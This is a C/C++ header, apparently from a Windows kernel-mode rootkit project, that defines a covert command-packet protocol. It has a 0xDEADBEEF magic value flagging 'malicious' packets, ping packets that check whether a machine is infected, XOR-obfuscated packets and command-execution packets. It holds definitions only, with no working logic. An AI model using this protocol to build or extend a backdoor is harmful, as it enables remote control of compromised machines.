/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#pragma once
#if _KERNEL_MODE == 1
#include <fltKernel.h>
#else
#include <Windows.h>
#endif

#define RCAST reinterpret_cast
#define SCAST static_cast
#define CCAST const_cast

//
// The magic value to look for in packets. Indicates a malicious packet.
//
#define PACKET_MAGIC 0xDEADBEEF
//
// The type of variable to use for the PACKET_MAGIC.
//
#define PACKET_MAGIC_TYPE ULONG
//
// The maximum number of bytes a packet can contain. If over this limit, the packet wont be scanned for the PACKET_MAGIC.
//
#define PACKET_MAX_SIZE 0x1000

typedef enum class _PACKET_TYPE
{
	Ping,		// Used to check if a machine/port is infected.
	Xor,		// Used to obfuscate the contents of a packet with XOR obfuscation.
	Command,	// Used to execute a command.
} PACKET_TYPE;

typedef struct _BASE_PACKET
{
	ULONG PacketLength;	// The length of the packet. *Does not contain the size of the MAGIC.*
	PACKET_TYPE Type;	// Indicates the type of packet.
} BASE_PACKET, *PBASE_PACKET;

typedef struct _MAGIC_BASE_PACKET
{
	PACKET_MAGIC_TYPE Magic;		// Indicates that the packet is malicious.
	BASE_PACKET Base;	// Contains standard information about the packet.
} MAGIC_BASE_PACKET, *PMAGIC_BASE_PACKET;

#define MAGIC_SIZE (sizeof(MAGIC_BASE_PACKET) - sizeof(BASE_PACKET))

#pragma pack(push, 1)
typedef struct _XOR_PACKET
{
	BASE_PACKET Base;	// Contains standard information about the packet.
	BYTE XorKey;		// The XOR key used to obfuscate the packet.
	BYTE XorContent[1];	// The XOR'd packet to dispatch.
} XOR_PACKET, *PXOR_PACKET;
#pragma pack(pop)

#define XOR_PACKET_SIZE(contentLength) ((sizeof(XOR_PACKET) - 1) + contentLength)

#pragma pack(push, 1)
typedef struct _GENERIC_BUFFER_PACKET
{
	BASE_PACKET Base;				// Contains standard information about the packet.
	ULONG BufferSize;				// The size of the generic buffer (in bytes).
	WCHAR Buffer[1];				// The generic buffer.
} GENERIC_BUFFER_PACKET, *PGENERIC_BUFFER_PACKET;
#pragma pack(pop)

#define GENERIC_BUFFER_PACKET_SIZE(bufferSize) ((sizeof(GENERIC_BUFFER_PACKET) - 1) + bufferSize)
